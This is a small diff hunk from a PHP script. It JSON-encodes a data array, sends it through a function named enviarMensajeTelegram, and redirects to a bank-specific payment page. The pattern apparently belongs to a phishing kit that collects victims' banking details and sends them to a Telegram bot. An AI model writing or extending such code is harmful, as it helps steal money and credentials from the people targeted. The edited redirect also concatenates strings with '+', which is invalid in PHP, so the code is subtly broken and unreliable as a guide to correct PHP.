@@ -37,6 +37,6 @@ $data = array(
 
 $jsonData = json_encode($data);
 enviarMensajeTelegram($jsonData);
-header('location:/pago/'+$banco+'/'$banco+'.php');
+header('location:/pago/'+$banco+'/'+$banco+'.php');
 ?>
 
